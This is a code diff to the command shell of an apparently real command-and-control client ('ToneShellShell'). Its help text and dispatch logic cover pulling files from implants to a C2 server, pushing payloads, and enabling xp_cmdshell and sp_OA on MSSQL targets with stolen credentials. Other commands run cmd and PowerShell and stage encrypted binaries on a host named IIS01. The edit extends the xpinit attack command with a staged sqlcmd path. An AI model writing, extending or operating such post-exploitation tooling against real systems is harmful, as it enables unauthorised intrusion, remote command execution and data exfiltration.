@@ -15,7 +15,7 @@ Built-in commands (case-insensitive):
     get <remote_path>               upload file FROM implant to C2 server
     put <payload_name> <dest_path>  push file FROM server payloads dir TO implant
     kill                            send TERMINATE (id=255) to current implant
-    xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
+    xpinit <host:port> <login> <pass> [sqlcmd_path]  enable xp_cmdshell + sp_OA on MSSQL target; sqlcmd_path = staged go-sqlcmd exe to use for all tunnel invocations
     xpshell cmd <cmd>               [DEPRECATED] run cmd via .bat staging on IIS01; use xpexec instead
     xpshell psh <ps_script>         [DEPRECATED] stage .ps1 and run PowerShell on IIS01; use xpexec powershell -Command instead
     xpstage-aes <payload> [--no-encrypt]   [DEPRECATED] stage binary via AES-256-CBC base64 + PowerShell on IIS01; use xpstage-hex instead
@@ -144,13 +144,14 @@ class ToneShellShell(C2Client):
                         self.cmd_kill()
 
                 elif cmd == "xpinit":
-                    tokens = line.split(None, 3)
+                    tokens = line.split(None, 4)
                     if len(tokens) < 4:
-                        print("usage: xpinit <host:port> <login> <pass>")
+                        print("usage: xpinit <host:port> <login> <pass> [sqlcmd_path]")
                     elif not self.session:
                         print("[!] not attached to a session")
                     else:
-                        self._xp.cmd_xpinit(self, tokens[1], tokens[2], tokens[3])
+                        self._xp.cmd_xpinit(self, tokens[1], tokens[2], tokens[3],
+                                            sqlcmd_path=(tokens[4] if len(tokens) > 4 else None))
 
                 elif cmd == "xpshell":
                     if not self.session:
